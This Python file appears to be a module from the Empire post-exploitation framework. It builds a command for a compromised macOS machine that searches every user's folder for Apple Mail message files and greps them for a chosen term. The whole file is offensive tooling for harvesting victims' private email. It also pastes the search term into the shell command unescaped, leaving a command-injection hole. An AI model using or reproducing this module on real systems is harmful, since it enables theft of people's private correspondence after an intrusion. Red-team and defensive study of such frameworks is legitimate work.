from builtins import object
from typing import Dict, Tuple, Optional

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:
        searchTerm = params['SearchTerm']

        script = "cmd = \"find /Users/ -name *.emlx 2>/dev/null"

        if searchTerm != "":
            script += "|xargs grep -i '"+searchTerm+"'\""
        else:
            script += "\""

        script += "\nrun_command(cmd)"

        return script
